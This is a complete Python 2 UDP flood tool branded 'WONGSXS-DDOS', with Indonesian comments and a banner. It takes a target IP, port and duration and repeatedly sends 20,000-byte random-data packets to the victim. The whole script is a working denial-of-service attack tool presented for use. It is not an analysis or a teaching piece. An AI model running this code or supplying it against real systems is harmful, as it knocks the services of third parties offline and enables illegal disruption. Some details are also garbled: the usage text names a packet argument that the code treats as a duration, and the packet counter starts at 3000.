import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#############################################################"
    print "#------------------------[\033[1;91mWONGSXS-DDOS\033[1;32m]---------------------#"
    print "#-----------------------------------------------------------#"
    print "#   \033[1;91mMenjalankan: " "python2 wongsxs.py " "<ip> <port> <packet> \033[1;32m    #"
    print "#                                                           #"
    print "#\033[1;91m Creator:MR Y          wongsxs ddos              #"
    print "#\033[1;91m Team   :MR Y          this is me                #"
    print "#\033[1;91m Version:0.1           0.1 wongsxs               #"
    print "#                                                           #"
    print "#                                                           #"
    print "#               \033[1;91m<--[wongsxs javanesse]-->               \033[1;32m#"
    print "#############################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
def flood(victim, vport, duration):
    # Support ME... :)
    # Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMulai \033[1;32m%s \033[1;91mmengirim PAKET \033[1;32m%s \033[1;91mDDOS pada target \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
